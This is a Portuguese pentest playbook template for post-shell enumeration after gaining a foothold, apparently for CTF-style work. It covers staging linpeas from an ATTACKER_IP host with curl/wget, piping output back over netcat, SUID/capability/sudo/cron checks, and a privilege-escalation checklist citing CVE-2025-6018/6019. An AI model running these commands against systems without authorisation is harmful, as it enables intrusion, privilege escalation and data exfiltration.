# Fase 4.5: Enumeração Pós-Shell (Obrigatória)
## Target: {{TARGET}} ({{TARGET_IP}})

> **REGRA ABSOLUTA:** A cada novo nível de acesso obtido (novo shell, novo user, novo contexto),
> esta fase DEVE ser executada ANTES de qualquer tentativa manual de privesc ou lateral movement.

---

## Papel
Enumerador automatizado de superfície interna. Coletar TUDO sobre o sistema via scripts
automatizados para depois analisar com calma — não ficar adivinhando manualmente.

## Por Que Esta Fase Existe

**Lição aprendida:** Enumeração manual ad-hoc gasta tempo e perde informações críticas.
Ferramentas como linpeas/winpeas são projetadas para encontrar centenas de vetores de
privesc em segundos. Informações que levariam horas para descobrir manualmente
(versões de PAM, polkit rules, capabilities, cron jobs, SUID bins, etc.) aparecem
no output em destaque.

**Exemplo real:** Uma versão de PAM 1.3.0 vulnerável a CVE-2025-6018 foi ignorada
durante enumeração manual, mas teria aparecido em destaque no linpeas.

---

## Quando Executar

| Trigger | Ação |
|---------|------|
| Obteve RCE / reverse shell (qualquer user) | Rodar linpeas/winpeas IMEDIATAMENTE |
| Escalou para novo user (su, SSH, lateral) | Rodar linpeas/winpeas NOVAMENTE como novo user |
| Obteve acesso a novo host (pivot) | Rodar linpeas/winpeas no novo host |
| Encontrou credenciais de serviço (DB, Redis, etc.) | Enumerar serviço + rodar linpeas se deu shell |

---

## Metodologia

### 1. Transferir Ferramenta de Enumeração

```bash
# Linux → linpeas
# Opção A: Download direto no alvo (se tem internet)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh

# Opção B: Via HTTP server da máquina atacante
# Atacante:
python3 -m http.server 8888 -d /opt/tools/
# Alvo:
curl http://ATTACKER_IP:8888/linpeas.sh -o /tmp/linpeas.sh
wget http://ATTACKER_IP:8888/linpeas.sh -O /tmp/linpeas.sh

# Opção C: Via SCP (se tem SSH)
scp linpeas.sh user@TARGET:/tmp/linpeas.sh

# Windows → winpeas
# Mesma lógica, usando winPEASx64.exe ou winPEASany.exe
```

### 2. Executar e Salvar Output

```bash
# SEMPRE salvar o output completo — analisar depois
chmod +x /tmp/linpeas.sh

# Execução padrão (salva no alvo + exibe)
/tmp/linpeas.sh -a 2>&1 | tee /tmp/linpeas_$(whoami)_$(date +%Y%m%d_%H%M%S).txt

# Se tee não funcionar (shell limitado):
/tmp/linpeas.sh -a > /tmp/linpeas_output.txt 2>&1

# Copiar output para máquina atacante
scp user@TARGET:/tmp/linpeas_output.txt evidence/linpeas_USER.txt
# Ou via netcat:
# Atacante: nc -lvnp 9999 > evidence/linpeas_USER.txt
# Alvo: cat /tmp/linpeas_output.txt | nc ATTACKER_IP 9999
```

### 3. Enumeração Complementar (se linpeas falhar ou for insuficiente)

```bash
# Informações básicas do sistema
cat /etc/os-release
uname -a
id
whoami
hostname

# Versões de software crítico (PRIVESC GOLDMINE)
# CADA versão aqui deve ser pesquisada no searchsploit + NVD + web
rpm -qa 2>/dev/null | grep -iE 'pam|polkit|sudo|systemd|dbus|udisks|pkexec|glib'  # RPM-based
dpkg -l 2>/dev/null | grep -iE 'pam|polkit|sudo|systemd|dbus|udisks|pkexec|glib'  # Debian-based

# SUID/SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron
cat /etc/crontab
ls -la /etc/cron.*/ 2>/dev/null
crontab -l 2>/dev/null

# Sudo
sudo -l 2>/dev/null

# Serviços rodando como root
ps aux | grep root

# Network listeners internos
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null

# Arquivos writable interessantes
find /etc -writable -type f 2>/dev/null
find /opt -writable -type f 2>/dev/null

# Polkit rules (Linux)
ls -la /etc/polkit-1/rules.d/ /usr/share/polkit-1/rules.d/ 2>/dev/null
grep -r 'allow_active.*yes' /usr/share/polkit-1/actions/ 2>/dev/null

# Mail (pode conter hints em CTF)
ls /var/mail/ /var/spool/mail/ 2>/dev/null
cat /var/mail/* 2>/dev/null
```

### 4. Análise do Output — O Que Procurar

#### Prioridade ALTA (privesc direto):
- [ ] **CVEs destacados pelo linpeas** (seção "CVEs Check") → pesquisar CADA UM
- [ ] **Versões de software** com CVEs conhecidos (PAM, polkit, sudo, kernel, systemd, pkexec)
- [ ] SUID/SGID binaries incomuns (não-padrão do OS)
- [ ] Capabilities perigosas (cap_setuid, cap_dac_override, etc.)
- [ ] sudo rules exploráveis (GTFOBins)
- [ ] Cron jobs writable ou com wildcards
- [ ] Arquivos de config com credenciais (DB, API keys, SSH keys)
- [ ] Docker socket acessível (/var/run/docker.sock)

#### Prioridade MÉDIA (requer cadeia):
- [ ] Polkit actions com allow_active=yes (requer session como "active")
- [ ] Serviços internos sem autenticação (Redis, MongoDB, etc.)
- [ ] PATH hijacking em scripts privilegiados
- [ ] Timers do systemd writable
- [ ] NFS com no_root_squash

#### Prioridade BAIXA (informação para combinar):
- [ ] Network listeners internos (pode ter serviços ocultos)
- [ ] Users e groups (quem tem acesso a quê)
- [ ] Mount options (nosuid? noexec?)
- [ ] Kernel modules carregados

### 5. CVE Research Pós-Enumeração

> **REGRA CRÍTICA:** Para CADA versão de software relevante encontrada na enumeração,
> executar pesquisa de CVE completa seguindo a Fase 1b.

```bash
# Para cada versão encontrada:
searchsploit PRODUTO VERSAO

# E SEMPRE complementar com busca web:
# - NVD: https://nvd.nist.gov/vuln/search?query=PRODUTO+VERSAO
# - Google: "PRODUTO VERSAO" CVE exploit LPE privilege escalation
# - SOCRadar, Qualys advisories, oss-security mailing list
```

> **CVEs vêm em cadeias!** Ao encontrar um CVE (ex: CVE-2025-6018), SEMPRE pesquisar
> na web se ele tem CVEs relacionados/companion. Advisories frequentemente descrevem
> múltiplas vulns que se combinam (ex: CVE-2025-6018 + CVE-2025-6019 = unprivileged → root).

---

## Regras de Ouro

### 1. Nunca pular esta fase
Não importa se "parece simples" ou "já sei o que procurar". linpeas vê coisas que você não vê.

### 2. Rodar como CADA user
Output de linpeas como wwwrun ≠ output como phileasfogg3. Contextos diferentes revelam vetores diferentes.

### 3. Salvar TUDO
Output vai para `evidence/linpeas_USERNAME_TIMESTAMP.txt`. Nunca descartar.

### 4. Analisar ANTES de agir
Ler o output do linpeas inteiro ANTES de começar a tentar privesc. O vetor mais fácil pode estar na última seção.

### 5. CVE Research é obrigatória
Cada versão de software relevante → searchsploit + NVD + Google. Não pular.

---

## Deliverable → `evidence/`

```
evidence/
├── linpeas_wwwrun_20260208.txt       # Output como primeiro user
├── linpeas_phileasfogg3_20260208.txt  # Output como segundo user
├── system_versions.txt                # Tabela de versões encontradas
└── privesc_vectors.md                 # Análise dos vetores identificados
```

### Formato de `privesc_vectors.md`:

```markdown
# Privesc Vectors — {{TARGET}}

## Sistema
- OS: [distro + versão]
- Kernel: [versão]
- Arch: [x86_64/etc]

## Versões Críticas Encontradas
| Software | Versão | CVE Conhecido? | Status |
|----------|--------|----------------|--------|
| PAM | 1.3.0 | CVE-2025-6018 | ✅ Vulnerável |
| udisks2 | 2.9.2 | CVE-2025-6019 | ✅ Vulnerável |
| sudo | X.Y.Z | — | ❌ Patcheado |

## Vetores Identificados (por prioridade)
### 1. [Vetor principal]
...

### 2. [Vetor alternativo]
...

## Cadeia de Exploração Proposta
[Vetor A] → [Vetor B] → root
```

---

## Integração com Outras Fases

- **Output desta fase** alimenta diretamente a exploração (Fases 4a-4e)
- **Versões encontradas** alimentam nova rodada de CVE Research (Fase 1b)
- **Credenciais encontradas** alimentam Auth Exploit (Fase 4a)
- **Serviços internos** alimentam nova rodada de Recon (Fase 2)
